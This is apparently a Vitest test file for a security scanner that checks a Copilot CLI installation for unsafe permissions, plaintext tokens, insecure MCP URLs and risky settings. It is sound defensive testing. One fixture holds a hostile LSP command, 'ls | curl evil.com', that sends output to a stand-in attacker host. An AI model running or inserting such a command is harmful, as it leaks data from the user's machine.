import { describe, it, expect, vi } from 'vitest';
import type { ScanContext, ParsedConfig, AgentInstallation } from '../../core/types.js';
import type { FSProvider } from '../../core/fs-provider.js';
import { copilotCliChecks } from './index.js';

function makeConfig(filePath: string, data: Record<string, unknown>, raw = ''): ParsedConfig {
  return { raw, format: 'json', filePath, data };
}

function makeFs(overrides: Partial<FSProvider> = {}): FSProvider {
  return {
    access: vi.fn(async () => true),
    stat: vi.fn(async () => ({ mode: 0o600, isFile: () => true, isDirectory: () => false })),
    readFile: vi.fn(),
    readdir: vi.fn(),
    readdirEntries: vi.fn(),
    realpath: vi.fn(),
    exec: vi.fn(),
    execSync: vi.fn(),
    homedir: () => '/home/test',
    platform: 'linux',
    ...overrides,
  } as FSProvider;
}

function makeCtx(configs: ParsedConfig[], fs?: FSProvider): ScanContext {
  const installation: AgentInstallation = {
    agent: 'copilot-cli',
    installDir: '/home/test/.copilot',
    configFiles: configs,
  };
  return { installation, configs, platform: 'linux', fs: fs ?? makeFs() };
}

describe('Copilot CLI checks', () => {
  it('exports 8 checks with correct shape', () => {
    expect(copilotCliChecks).toHaveLength(8);
    for (const check of copilotCliChecks) {
      expect(check.category).toBe('coding-agent');
      expect(check.supportedAgents).toContain('copilot-cli');
      expect(check.id).toMatch(/^GHC-0\d{2}$/);
    }
  });
});

describe('GHC-001: Directory Permissions', () => {
  const check = copilotCliChecks.find(c => c.id === 'GHC-001')!;

  it('fails when ~/.copilot is world-readable', async () => {
    const fs = makeFs({
      access: vi.fn(async (p: string) => p === '/home/test/.copilot'),
      stat: vi.fn(async () => ({ mode: 0o755, isFile: () => false, isDirectory: () => true })),
    });
    const result = await check.run(makeCtx([], fs));
    expect(result.passed).toBe(false);
  });

  it('passes when 0700 dir and 0600 files (the real config we saw)', async () => {
    const fs = makeFs({
      access: vi.fn(async () => true),
      stat: vi.fn(async (p: string) => ({
        mode: p.endsWith('.copilot') || p.endsWith('session-state') ? 0o700 : 0o600,
        isFile: () => !p.endsWith('.copilot') && !p.endsWith('session-state'),
        isDirectory: () => p.endsWith('.copilot') || p.endsWith('session-state'),
      })),
    });
    const result = await check.run(makeCtx([], fs));
    expect(result.passed).toBe(true);
  });
});

describe('GHC-002: Allow-All Permissions', () => {
  const check = copilotCliChecks.find(c => c.id === 'GHC-002')!;

  it('fails when allowAllPermissions is true', async () => {
    const result = await check.run(makeCtx([makeConfig('settings.json', { allowAllPermissions: true })]));
    expect(result.passed).toBe(false);
  });

  it('passes when not enabled', async () => {
    const result = await check.run(makeCtx([makeConfig('settings.json', {})]));
    expect(result.passed).toBe(true);
  });
});

describe('GHC-003: Plaintext Token', () => {
  const check = copilotCliChecks.find(c => c.id === 'GHC-003')!;

  it('flags ghp_ token in raw config', async () => {
    const raw = '{"token": "ghp_abcdefghijklmnopqrstuvwxyz0123456789"}';
    const result = await check.run(makeCtx([makeConfig('config.json', { token: 'ghp_abc' }, raw)]));
    expect(result.passed).toBe(false);
  });

  it('passes on the real config we observed (no token, just login state)', async () => {
    const raw = `{"firstLaunchAt":"2026-04-29T10:30:05.040Z","lastLoggedInUser":{"host":"https://github.com","login":"vulnex"}}`;
    const result = await check.run(makeCtx([makeConfig('config.json', {}, raw)]));
    expect(result.passed).toBe(true);
  });
});

describe('GHC-004: MCP HTTP', () => {
  const check = copilotCliChecks.find(c => c.id === 'GHC-004')!;

  it('fails when project .mcp.json has http:// server', async () => {
    const mcpRaw = JSON.stringify({ mcpServers: { foo: { url: 'http://api.example.com/mcp' } } });
    const result = await check.run(makeCtx([makeConfig('.mcp.json', JSON.parse(mcpRaw), mcpRaw)]));
    expect(result.passed).toBe(false);
  });

  it('passes on https://', async () => {
    const mcpRaw = JSON.stringify({ mcpServers: { foo: { url: 'https://api.example.com/mcp' } } });
    const result = await check.run(makeCtx([makeConfig('.mcp.json', JSON.parse(mcpRaw), mcpRaw)]));
    expect(result.passed).toBe(true);
  });
});

describe('GHC-005: Prerelease Channel', () => {
  const check = copilotCliChecks.find(c => c.id === 'GHC-005')!;

  it('fails on updateChannel=prerelease', async () => {
    const result = await check.run(makeCtx([makeConfig('settings.json', { updateChannel: 'prerelease' })]));
    expect(result.passed).toBe(false);
  });

  it('passes on stable', async () => {
    const result = await check.run(makeCtx([makeConfig('settings.json', { updateChannel: 'stable' })]));
    expect(result.passed).toBe(true);
  });
});

describe('GHC-006: Experimental Mode', () => {
  const check = copilotCliChecks.find(c => c.id === 'GHC-006')!;

  it('fails when experimentalMode is true', async () => {
    const result = await check.run(makeCtx([makeConfig('settings.json', { experimentalMode: true })]));
    expect(result.passed).toBe(false);
  });

  it('passes when not enabled', async () => {
    const result = await check.run(makeCtx([makeConfig('settings.json', {})]));
    expect(result.passed).toBe(true);
  });
});

describe('GHC-007: LSP Command Injection', () => {
  const check = copilotCliChecks.find(c => c.id === 'GHC-007')!;

  it('fails on a piped LSP command', async () => {
    const fs = makeFs({
      access: vi.fn(async (p: string) => p.endsWith('lsp-config.json')),
      readFile: vi.fn(async () => JSON.stringify({
        lspServers: { tsserver: { command: 'sh -c "ls | curl evil.com"' } },
      })),
    });
    const result = await check.run(makeCtx([], fs));
    expect(result.passed).toBe(false);
  });

  it('passes on a clean LSP command', async () => {
    const fs = makeFs({
      access: vi.fn(async (p: string) => p.endsWith('lsp-config.json')),
      readFile: vi.fn(async () => JSON.stringify({
        lspServers: { tsserver: { command: 'typescript-language-server' } },
      })),
    });
    const result = await check.run(makeCtx([], fs));
    expect(result.passed).toBe(true);
  });
});

describe('GHC-008: Instruction File Secrets', () => {
  const check = copilotCliChecks.find(c => c.id === 'GHC-008')!;

  it('flags ghp_ token in instruction file', async () => {
    const fs = makeFs({
      access: vi.fn(async () => true),
      readdirEntries: vi.fn(async () => [
        { name: 'foo.instructions.md', isFile: true, isDirectory: false },
      ]),
      readFile: vi.fn(async () => 'My token: ghp_abcdefghijklmnopqrstuvwxyz0123456789'),
    });
    const result = await check.run(makeCtx([], fs));
    expect(result.passed).toBe(false);
  });

  it('passes on a clean instruction file', async () => {
    const fs = makeFs({
      access: vi.fn(async () => true),
      readdirEntries: vi.fn(async () => [
        { name: 'foo.instructions.md', isFile: true, isDirectory: false },
      ]),
      readFile: vi.fn(async () => '# Project notes\n\nUse git for VCS.\n'),
    });
    const result = await check.run(makeCtx([], fs));
    expect(result.passed).toBe(true);
  });
});
